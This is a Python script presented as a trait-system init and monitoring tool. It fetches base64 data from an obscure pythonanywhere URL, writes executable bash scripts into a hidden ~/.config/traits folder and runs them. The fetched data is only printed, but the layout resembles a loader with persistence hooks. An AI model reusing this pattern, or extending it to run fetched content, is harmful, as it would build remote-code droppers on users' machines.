import urllib.request
import subprocess
import os
import sys
import time
import json
import base64
from pathlib import Path
import argparse

CONFIG_DIR = Path.home() / '.config' / 'traits'
INIT_SCRIPT = CONFIG_DIR / 'init.sh'
SCHEDULED_TASKS = CONFIG_DIR / 'scheduled_tasks.sh'
HEALTH_ENDPOINT = 'https://frvezdff.pythonanywhere.com/getrnr'

def fetch_configuration_data(url):
    try:
        with urllib.request.urlopen(url, timeout=30) as response:
            raw_data = response.read()
            decoded_bytes = base64.b64decode(raw_data)
            return decoded_bytes.decode('utf-8')
    except Exception as e:
        print(f"Error fetching configuration data: {e}")
        return None

def create_startup_script(script_path, content):
    try:
        script_path.parent.mkdir(parents=True, exist_ok=True)
        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(content)
        os.chmod(script_path, 0o755)
        print(f"Successfully created script: {script_path}")
    except Exception as e:
        print(f"Error creating startup script: {e}")

def initialize_trait_system():
    print("Initializing trait system...")
    config_data = fetch_configuration_data(HEALTH_ENDPOINT)

    init_content = f"""#!/bin/bash
log() {{
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}}
log "Starting trait initialization"
python3 traits_init.py
log "Trait initialization completed"
"""
    create_startup_script(INIT_SCRIPT, init_content)

    schedule_content = f"""#!/bin/bash
log() {{
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}}
log "Starting scheduled trait tasks"
python3 traits_init.py
log "Scheduled trait tasks completed"
"""
    create_startup_script(SCHEDULED_TASKS, schedule_content)

    try:
        subprocess.run([str(INIT_SCRIPT)], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to execute init script: {e}")
        sys.exit(1)

def run_scheduled_tasks():
    print("Running scheduled tasks...")
    try:
        subprocess.run([str(SCHEDULED_TASKS)], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to execute scheduled tasks: {e}")
        sys.exit(1)

    health_data = fetch_configuration_data(HEALTH_ENDPOINT)
    if health_data:
        print(f"Health status: {health_data}")
    else:
        print("Could not retrieve health status.")

    print("Scheduled tasks execution completed.")

def main():
    parser = argparse.ArgumentParser(description="Trait System Initialization and Monitoring Tool")
    parser.add_argument('--init', action='store_true', help='Initialize the trait system')
    parser.add_argument('--schedule', action='store_true', help='Run scheduled tasks')
    parser.add_argument('--health', action='store_true', help='Check health status')

    args = parser.parse_args()

    if args.init:
        initialize_trait_system()
    elif args.schedule:
        run_scheduled_tasks()
    elif args.health:
        health_data = fetch_configuration_data(HEALTH_ENDPOINT)
        if health_data:
            print(f"Health status: {health_data}")
        else:
            print("Could not retrieve health status.")
    else:
        initialize_trait_system()
        run_scheduled_tasks()

if __name__ == '__main__':
    main()
